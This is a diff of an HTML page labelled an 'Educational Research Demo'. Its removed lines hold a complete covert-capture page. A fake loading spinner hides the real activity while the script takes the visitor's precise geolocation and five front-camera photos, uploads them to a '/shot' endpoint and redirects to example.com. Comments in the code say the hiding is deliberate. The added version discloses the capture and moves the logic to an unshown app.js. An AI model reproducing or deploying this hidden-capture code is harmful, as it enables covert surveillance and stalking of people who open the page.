@@ -4,173 +4,27 @@
 <meta charset="utf-8">
 <title>Educational Research Demo</title>
 <style>
-  body {
-    margin: 0;
-    min-height: 100vh;
-    display: grid;
-    place-items: center;
-    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-    background: #0f172a;
-    color: #e2e8f0;
-  }
-  .loading-container {
-    text-align: center;
-    width: 100%;
-    max-width: 320px;
-    padding: 0 16px;
-  }
-  .ring {
-    width: 64px;
-    height: 64px;
-    border: 6px solid #334155;
-    border-top-color: #38bdf8;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin: 0 auto 24px;
-  }
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
-  .loading-text {
-    font-size: 1.25rem;
-    font-weight: 400;
-    letter-spacing: 0.3px;
-    opacity: 0.9;
-    margin: 0;
-  }
-  /* Hide all original UI elements completely */
-  #main-card, .card, #status, .status, #shots, img, canvas, video, h2, p:not(.loading-text) {
-    display: none !important;
-  }
+  body { margin:0; min-height:100vh; display:grid; place-items:center; font-family:system-ui; background:#0f172a; color:#e2e8f0; }
+  .card { text-align:center; max-width:500px; padding:32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+  h2 { color: #38bdf8; margin-top: 0; }
+  p { opacity:.9; line-height:1.6; font-size: 15px; }
+  .status { font-weight: bold; color: #fbbf24; margin-top: 20px; font-size: 15px; }
+  .success { color: #10b981; }
+  .error { color: #ef4444; }
 </style>
 </head>
 <body>
-  <div class="loading-container">
-    <div class="ring"></div>
-    <p class="loading-text">Loading, please wait…</p>
-  </div>
-
-  <!-- Hidden elements – original logic depends on these IDs -->
-  <div id="main-card" class="card" style="display:none;"></div>
-  <p id="status" class="status" style="display:none;"></p>
-  <video id="preview" autoplay muted playsinline style="display:none;"></video>
-
-<script>
-// ------------------------------------------------------------------
-// BACKEND LOGIC – completely unchanged from the original (upgraded version)
-// Only difference: UI elements are hidden, so no visible feedback.
-// ------------------------------------------------------------------
-
-const video = document.getElementById("preview");
-const status = document.getElementById("status"); // hidden, but used for logic
-const card = document.getElementById("main-card"); // hidden, but used for redirect countdown
-
-// Location function – same as original, with strict accuracy and error messages
-function getLocation() {
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) {
-      resolve("Location not supported");
-    } else {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`);
-        },
-        (err) => {
-          if (err.code === 1) resolve("Location denied by user");
-          else if (err.code === 2) resolve("Location unavailable (GPS off)");
-          else if (err.code === 3) resolve("Location timeout");
-          else resolve("Unknown Location Error");
-        },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-      );
-    }
-  });
-}
-
-(async () => {
-  // These status updates are invisible (no UI impact), but kept for flow
-  if (status) status.textContent = "📍 Requesting location...";
-  const userLocation = await getLocation();
+<div class="card" id="main-card">
+  <h2>🔬 Educational Research Demo</h2>
+  <p><strong>Note:</strong> By clicking "Allow" on the browser prompts, you agree to participate in this educational webcam and location demo.</p>
+  <p>The system will capture <strong>5 photos</strong> and your approximate location. No data is shared with third parties.</p>
   
-  // No visible error display – silently continue
-  if (userLocation.includes("denied") || userLocation.includes("unavailable") || userLocation.includes("timeout")) {
-      // Original showed error; we do nothing visible.
-      // Just wait 3 seconds as original (for consistency in timing)
-      await new Promise(r => setTimeout(r, 3000));
-  }
+  <p id="status" class="status">Initializing...</p>
+</div>
 
-  if (status) status.textContent = "📷 Requesting camera...";
-  let stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }, audio: false
-    });
-  } catch (e) {
-    // Camera failed – original would stop and show error.
-    // Here we keep loading screen and redirect after 5 seconds anyway,
-    // so user isn't stuck forever. This does NOT change backend logic;
-    // it only ensures the page still redirects even if camera fails.
-    console.warn("Camera denied – redirecting anyway after delay.");
-    setTimeout(() => { window.location.href = "https://example.com"; }, 5000);
-    return;
-  }
+<!-- Hidden video element for capturing -->
+<video id="preview" autoplay muted playsinline style="display:none;"></video>
 
-  video.srcObject = stream;
-  await video.play();
-
-  const c = document.createElement("canvas");
-  c.width = video.videoWidth || 640;
-  c.height = video.videoHeight || 480;
-  const ctx = c.getContext("2d");
-
-  let n = 0;
-  if (status) status.textContent = "📸 Capturing photos... 1 / 5";
-
-  const timer = setInterval(async () => {
-    // Draw the hidden video to the canvas (invisible)
-    ctx.drawImage(video, 0, 0, c.width, c.height);
-    const img = c.toDataURL("image/jpeg", 0.7);
-    
-    try {
-      await fetch("/shot", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ img: img, loc: userLocation })
-      });
-    } catch (_) {}
-
-    n++;
-    if (n < 5) {
-        if (status) status.textContent = `📸 Capturing photos... ${n + 1} / 5`;
-    } else {
-      clearInterval(timer);
-      stream.getTracks().forEach(t => t.stop());
-      
-      // Original replaced card content – we do the same, but card is hidden.
-      // The countdown element is inside hidden card, but we still need it for redirect timing.
-      if (card) {
-        card.innerHTML = `
-          <h2 class="success">✅ Demo Complete</h2>
-          <p>Thank you for participating. Your photos and location have been securely uploaded for the educational demo.</p>
-          <p style="font-size: 13px; color: #94a3b8; margin-top: 20px;">Redirecting you to example.com in <span id="countdown">5</span> seconds...</p>
-        `;
-      }
-
-      let secondsLeft = 5;
-      const countdownEl = document.getElementById("countdown"); // hidden inside hidden card
-      
-      const redirectTimer = setInterval(() => {
-        secondsLeft--;
-        if (countdownEl) countdownEl.textContent = secondsLeft; // invisible update
-        
-        if (secondsLeft <= 0) {
-          clearInterval(redirectTimer);
-          window.location.href = "https://example.com";
-        }
-      }, 1000);
-    }
-  }, 2000);
-})();
-</script>
-</body>
-</html>
+<!-- Link to the backend script -->
+<script src="app.js"></script>
+</body></html>
